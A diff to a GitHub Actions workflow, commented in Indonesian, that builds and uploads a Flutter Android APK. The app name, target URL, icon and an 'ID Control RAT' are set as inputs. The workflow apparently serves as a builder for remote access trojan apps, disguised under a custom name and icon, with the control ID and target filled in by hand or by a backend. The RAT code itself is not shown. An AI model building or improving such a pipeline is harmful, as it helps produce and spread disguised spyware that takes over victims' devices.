@@ -4,19 +4,19 @@ on:
   workflow_dispatch:
     inputs:
       app_name:
-        description: 'Nama Aplikasi (kosongkan kalau backend yang isi)'
+        description: 'Nama Aplikasi'
         required: false
         default: ''
       target_url:
-        description: 'URL Target (kosongkan kalau backend yang isi)'
+        description: 'URL Target'
         required: false
         default: ''
       control_id:
-        description: 'ID Control RAT (kosongkan kalau backend yang isi)'
+        description: 'ID Control RAT'
         required: false
         default: ''
       icon_url:
-        description: 'URL Icon APK (kosongkan kalau backend yang isi)'
+        description: 'URL Icon APK'
         required: false
         default: ''
 
@@ -37,11 +37,15 @@ jobs:
       - name: Setup Flutter
         uses: subosito/flutter-action@v2
         with:
-          flutter-version: '3.24.0'
           channel: 'stable'
           cache: true
 
-      - name: Inject Config (ONLY if manual input)
+      # 🆕 WAJIB: Bikin folder android otomatis
+      - name: Create Android Folder
+        run: flutter create . --platforms=android
+
+      # 🆕 Inject config manual HANYA kalau input diisi
+      - name: Inject Config (Manual Only)
         if: ${{ github.event.inputs.app_name != '' }}
         run: |
           mkdir -p assets
@@ -55,23 +59,34 @@ jobs:
           EOF
           echo "✅ Config injected from manual input"
 
+      # 🆕 Verify config aman (kalau file gak ada, bikin kosong)
       - name: Verify Config
         run: |
+          mkdir -p assets
+          if [ ! -f assets/config.json ]; then
+            echo "{}" > assets/config.json
+            echo "⚠️ Config tidak ada, bikin kosong"
+          fi
           echo "📄 Current config.json:"
           cat assets/config.json
 
+      # 🆕 Download icon manual (kalau ada)
       - name: Download Custom Icon
         if: ${{ github.event.inputs.icon_url != '' }}
         run: |
+          mkdir -p assets
           curl -L -o assets/icon.png "${{ github.event.inputs.icon_url }}"
           echo "✅ Icon downloaded"
 
+      # Get dependencies
       - name: Get Dependencies
         run: flutter pub get
 
+      # Build APK
       - name: Build APK Release
         run: flutter build apk --release
 
+      # Upload APK
       - name: Upload APK Artifact
         uses: actions/upload-artifact@v4
         with:
